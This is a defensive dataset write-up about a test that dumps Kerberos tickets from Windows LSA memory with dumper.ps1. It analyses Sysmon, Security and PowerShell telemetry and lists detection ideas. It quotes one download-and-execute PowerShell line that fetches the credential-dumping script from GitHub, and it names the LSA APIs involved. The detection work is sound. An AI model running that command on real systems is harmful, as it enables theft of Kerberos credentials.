# T1003.004-2: LSA Secrets — Dump Kerberos Tickets from LSA using dumper.ps1

## Technique Context

T1003.004 covers multiple approaches to extracting the Local Security Authority secrets. This test variant targets Kerberos tickets stored in LSA memory rather than the on-disk registry hive. The specific tool is `dumper.ps1` from the PowershellKerberos toolkit, which interacts directly with the LSA subsystem to extract Kerberos service tickets and their associated session keys. This is meaningfully different from the `reg save` approach in test -1: it targets live memory rather than the registry, and the resulting artifacts are in-memory ticket blobs rather than encrypted registry hive files.

Kerberos ticket extraction from LSA enables pass-the-ticket attacks and Silver/Golden Ticket creation depending on what tickets are accessible. The technique requires elevated privileges — the PowerShell process must run as SYSTEM or with `SeTcbPrivilege`. Detection focuses on LSASS process access events, unusual PowerShell loading of Kerberos-related .NET assemblies, network downloads of exploitation scripts, and privilege escalation events that precede LSA access.

In the defended version, Windows Defender blocked the script at AMSI inspection time before it could interact with LSA at all, generating a `ScriptContainedMaliciousContent` error. With Defender disabled, the script can download and execute, potentially extracting live Kerberos tickets from the running LSA.

## What This Dataset Contains

The dataset is substantially larger than the defended version: 562 PowerShell events vs. 47, 120 Sysmon events vs. 42, 72 Security events vs. 11. The volume increase reflects the script actually executing rather than being blocked at download.

The Sysmon channel shows the new PowerShell process (PID 6116) loading a full .NET runtime stack: `mscoree.dll`, `mscoreei.dll` (`4.8.9065.0 built by: NET481REL1LAST_C`), `clr.dll` (`4.8.9181.0`), `clrjit.dll`, and the native mscorlib image — this is the signature of a PowerShell process that loads and executes managed .NET code, which `dumper.ps1` relies on for its LSA interop. All these loads are tagged with Sysmon rule `technique_id=T1055,technique_name=Process Injection` because the Sysmon configuration flags .NET runtime loading in PowerShell as potentially suspicious.

The Security channel contains 14 EID 4657 events recording registry value modifications to `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\WMI\Autologger\EventLog-Application\{43833e12-078d-4d7d-8aaf-ae8c8520f18c}` — these appear to be side effects of Windows App Runtime updates running concurrently. The Security channel also shows EID 4688 events for `wevtutil.exe` installing and uninstalling event manifest files for `Microsoft.WindowsAppRuntime.1.8` and `1.7`, which is unrelated to the technique.

Notably, the Sysmon channel includes 1 EID 3 (network connection) event and 1 EID 22 (DNS query) event — these are absent in the defended version and are the most significant additions unique to this undefended run. They represent the successful network download of `dumper.ps1` from GitHub (the test uses `Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/...')`).

The System channel EID 7040 event shows the BITS service start type changing from auto to demand start, which is a side effect of concurrent system activity around the time of the test.

## What This Dataset Does Not Contain

The PowerShell 4103/4104 samples in this dataset show only framework boilerplate (Set-StrictMode, ErrorCategory_Message, OriginInfo). The actual `dumper.ps1` script content — particularly the LSA API calls and Kerberos ticket extraction logic — does not appear in the five sampled PowerShell events. With 562 total PowerShell events (449 EID 4103, 111 EID 4104), the technique-specific script block events exist in the full dataset but are not in the samples.

There are no Sysmon EID 10 events showing direct LSASS process access in the samples, though 6 total EID 10 events exist. No Sysmon EID 11 events show creation of ticket dump files. The Security channel lacks EID 4688 events showing the actual `powershell.exe` process spawned with the `Invoke-Expression` + `DownloadString` command line visible in the defended version — the samples here are dominated by `wevtutil.exe` side-effects.

Without access to the full event stream, it is not possible to confirm whether the Kerberos ticket extraction itself succeeded or if the script encountered access errors after downloading.

## Assessment

This dataset's primary value over the defended version lies in the presence of network telemetry (Sysmon EID 3/22) confirming the download succeeded, the substantially higher PowerShell event volume indicating the script ran rather than being blocked, and the .NET runtime loading pattern in Sysmon EID 7. The 449 EID 4103 (CommandInvocation) events in the full dataset likely contain the actual LSA API call sequences and Kerberos ticket data structures, making this dataset valuable for building behavioral detections around PowerShell-based Kerberos ticket extraction. The undefended run provides the "what does full execution look like" baseline that the defended dataset cannot.

## Detection Opportunities Present in This Data

1. Sysmon EID 3 (NetworkConnect) or EID 22 (DNSEvent) from `powershell.exe` to `raw.githubusercontent.com` immediately followed by significant PowerShell EID 4103/4104 volume is a strong indicator of a download-and-execute credential tool pattern.

2. PowerShell EID 4104 ScriptBlock events containing the string `PowershellKerberos` or `dumper.ps1` or `MzHmO` (the GitHub author) in the ScriptBlockText field — these will appear in the full event stream even though not in the samples.

3. Sysmon EID 7 showing `powershell.exe` loading the full .NET CLR stack (`mscoree.dll`, `clr.dll`, `clrjit.dll`) within a few hundred milliseconds of a download event is the behavioral signature of a managed .NET payload executing in PowerShell.

4. PowerShell EID 4103 CommandInvocation events referencing `LsaConnectUntrusted`, `LsaLookupAuthenticationPackage`, or `LsaCallAuthenticationPackage` in their payloads would directly identify LSA API access.

5. The combination of Security EID 4672 (special privileges assigned) with `SeTcbPrivilege` on a PowerShell process in the same session as a GitHub download event is a meaningful escalation indicator.

6. Sysmon EID 10 (ProcessAccess) showing PowerShell accessing `lsass.exe` with `GrantedAccess` values that include `PROCESS_VM_READ (0x0010)` would confirm the memory read phase of ticket extraction.
